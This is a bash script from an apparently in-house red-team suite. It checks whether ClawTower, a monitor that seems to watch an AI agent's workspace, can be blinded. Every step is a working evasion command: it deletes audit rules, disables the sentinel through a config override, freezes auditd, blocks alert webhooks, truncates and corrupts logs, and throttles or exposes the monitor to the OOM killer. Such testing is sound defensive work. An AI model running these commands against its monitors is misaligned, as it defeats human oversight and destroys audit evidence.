#!/usr/bin/env bash
# Red Lobster v6 — Flag 10: BLIND — Disabling ClawTower's senses
# v5 gaps: rapid create+delete (info only), process flood (info only)
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag10" "Flag 10: BLIND — Disabling ClawTower's senses (v6)"

# 1. auditctl -D delete all rules
rl_run "auditctl -D (delete rules)" \
  'sudo auditctl -D 2>/dev/null; sleep 2; sudo bash /home/openclaw/.openclaw/workspace/projects/ClawTower/scripts/setup-audit-rules.sh 2>/dev/null'

# 2. config.d override injection
rl_run "config.d override injection" \
  'printf "[sentinel]\nenabled = false\n" | sudo tee /etc/clawtower/config.d/99-permissive.toml >/dev/null; sleep 2; sudo rm -f /etc/clawtower/config.d/99-permissive.toml'

# 3. SIGSTOP auditd
rl_run "SIGSTOP auditd (freeze)" \
  'sudo kill -STOP $(pidof auditd) 2>/dev/null; sleep 2; sudo kill -CONT $(pidof auditd) 2>/dev/null'

# 4. iptables block Slack webhook
rl_run "iptables block Slack webhooks" \
  'sudo iptables -A OUTPUT -p tcp --dport 443 -d hooks.slack.com -j DROP 2>/dev/null; sleep 2; sudo iptables -D OUTPUT -p tcp --dport 443 -d hooks.slack.com -j DROP 2>/dev/null'

# 5. Truncate alert log
rl_run "truncate alert log" \
  'sudo truncate -s 0 /var/log/clawtower/alerts.jsonl 2>/dev/null'

# 6. Corrupt audit chain file
rl_run "corrupt audit chain" \
  'echo "CORRUPT" | sudo tee -a /var/log/clawtower/audit.chain 2>/dev/null'

# 7. Move alert log (rename, not truncate)
rl_run "mv alert log away" \
  'sudo mv /var/log/clawtower/alerts.jsonl /var/log/clawtower/alerts.jsonl.bak 2>/dev/null; sleep 2; sudo mv /var/log/clawtower/alerts.jsonl.bak /var/log/clawtower/alerts.jsonl 2>/dev/null'

# 8. Kill journald (ClawTower may use journald tailing)
rl_run "restart journald" \
  'sudo systemctl restart systemd-journald 2>/dev/null'

# 9. Flood mpsc channel (rapid-fire writes to watched files)
rl_run "flood mpsc channel (500 rapid file ops)" \
  'for i in $(seq 1 500); do touch /home/openclaw/.openclaw/workspace/SOUL.md.flood.$i; rm -f /home/openclaw/.openclaw/workspace/SOUL.md.flood.$i; done'

# 10. Unload auditd rules via auditctl -W (remove specific watches)
rl_run "auditctl -W remove specific watch" \
  'sudo auditctl -W /etc/shadow -p r -k clawtower_cred_read 2>/dev/null; sleep 2; sudo bash /home/openclaw/.openclaw/workspace/projects/ClawTower/scripts/setup-audit-rules.sh 2>/dev/null'

# 11. cgroup CPU throttle ClawTower
rl_run "cgroup CPU throttle ClawTower" \
  'sudo mkdir -p /sys/fs/cgroup/clawtower_throttle 2>/dev/null; echo 1000 | sudo tee /sys/fs/cgroup/clawtower_throttle/cpu.max 2>/dev/null; echo $(pidof clawtower) | sudo tee /sys/fs/cgroup/clawtower_throttle/cgroup.procs 2>/dev/null; sleep 2; echo $(pidof clawtower) | sudo tee /sys/fs/cgroup/cgroup.procs 2>/dev/null; sudo rmdir /sys/fs/cgroup/clawtower_throttle 2>/dev/null'

# 12. OOM score adj to make ClawTower killable
rl_run "OOM score adj on ClawTower" \
  'sudo bash -c "echo 1000 > /proc/$(pidof clawtower)/oom_score_adj" 2>/dev/null; sleep 1; sudo bash -c "echo -1000 > /proc/$(pidof clawtower)/oom_score_adj" 2>/dev/null'

rl_summary
rl_cleanup
